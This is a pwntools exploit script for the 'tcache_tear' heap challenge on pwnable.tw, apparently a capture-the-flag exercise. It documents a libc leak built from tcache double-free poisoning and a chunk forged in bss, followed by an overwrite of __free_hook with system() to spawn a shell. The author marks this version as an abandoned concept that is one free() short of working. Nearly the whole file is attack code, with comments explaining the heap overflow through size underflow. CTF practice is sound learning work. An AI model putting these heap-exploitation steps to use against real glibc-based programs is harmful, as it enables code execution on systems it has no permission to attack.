#!/usr/bin/env python3

'''
This is the concept that does not work because of a lack of free()'s
We need 9 but are only allowed 8, but using the heap overflow it is
possible to cut down on the number of frees (see solve.py). 
'''

from pwn import *

import os
os.chdir("./patched")

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

serv = "chall.pwnable.tw"
port = 10207

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            b *0x400b14
            b *0x00400c54
            """)
    return r

r = conn()


def alloc(size: int, data: bytes):
    # assert size <= 0xff and size >= 0
    sla(b'choice :', b'1')
    sla(b'Size:', sen(size))
    if size > 0:
        sna(b'Data:', enc(data))

def free():
    sla(b'choice :', b'2')

def read_from_bss():
    sla(b'choice :', b'3')
    r.recvuntil(b':') # Get rid of b'Name :'
    return r.recv(numb=0x20)

def main():

    '''
    Main ideas:
    1. To arb-read, finnick the addr qword we want to read from into the next ptr of a chunk in the tcache bin of some size. Alloc until
    the val we want to leak would be allocated next. Also, finnick 0x602070 which is in the middle of the writable bss, in which we can
    chunk forge, into the tcache bin of another size. The chunk at 0x602070 is already forged from the start since we are allowed to
    write to it. By this forging, we free the chunk at 0x602070 into the tcache bin of the first size (even though it is originally in
    the tcache bin of the other size), and so its next ptr is our val to be leaked. Printing the bss area leaks the val to us. 
    2. To arb-write, we can easily perform a double-free, or use the heap overflow

    Heap overflow:
    - The line `sub_400a25(data_602088, (bytes - 0x10));` writes bytes-0x10 bytes of data into our chunk,
    where bytes is the chunk size we provide to atoll()
    - Since we can allocate chunk sizes of < 0x10, this underflows (bytes - 0x10) and essentially lets us
    write arbitrary lengths of data starting from that chunk (bytes is an int64_t but is just treated as
    a uint64_t when the read from stdin occurs)
    '''

    # Put data into bss - this is not only required by the binary, but also is so that we chunk-forge to a size of 0x30
    sna(b'Name:', b'\x00'*0x8 + p64(0x31) + b'A'*0x10)


    '''
    Leaking libc through a combination of double-freeing into tcache poisoning, and forging the chunk in bss
    '''
    # First setup name+0x10 as the next to be allocated in the tcache bin for size 0x20
    alloc(0x8, b'A'*0x8)
    free()
    free()
    alloc(0x8, p64(0x602070)) # This inserts the chunk at name+0x10 into the tcache
    alloc(0x8, b'B'*0x8) # Now name+0x10 will be next allocated when a chunk of size 0x20 is allocated

    # We do the same but instead setup exe.got.printf as the next to be allocated in the tcache bin for size 0x30
    alloc(0x20, b'C'*0x10)
    free()
    free()
    free() # Extra free so that the count[idx] for the tcache bin does eventually become 0xff and be more than 7 thus avoiding the eventual freeing into the tcache
    alloc(0x20, p64(0x602040)) # This inserts the addr of bss.stderr into the tcache
    alloc(0x20, b'D') # We have no choice but to corrupt the LSB of bss.stderr as a side effect, but our leak remains unchanged
    alloc(0x20, b'E') # Now libc stderr is the first entry in the tcache bin of size 0x30

    # What we do now is to alloc a size of 0x8 so that 0x602070 goes into the bss ptr which we're using to keep track of chunks,
    # before freeing it (remember, its size got forced to 0x30!) so that its next ptr contains our leak
    alloc(0x8, b'F'*8)
    free()

    # Using option 3 of the binary, we read 0x20 bytes from 0x602060 and get our libc leak
    libc.address = u64(read_from_bss()[16:24]) - 0x3ec680
    log.info(f"{hex(libc.address)=}")


    '''
    Overwrite free_hook within the libc with libc system and run free to spawn a shell
    NOTE: Already tried to overwrite malloc_hook with one-gadgets but none of them worked
    '''
    alloc(0x30, b'G'*0x20)
    free()
    free()
    alloc(0x30, p64(libc.sym.__free_hook))
    alloc(0x30, b'H'*0x30)
    alloc(0x30, p64(libc.sym.system))
    alloc(0x40, b'/bin/sh\x00')

    # Actuate the free_hook by freeing
    ''' !!! IF ONLY I HAD ONE MORE FREE THIS WOULD WORK !!! '''
    free()

    r.interactive()


if __name__ == "__main__":
    main()
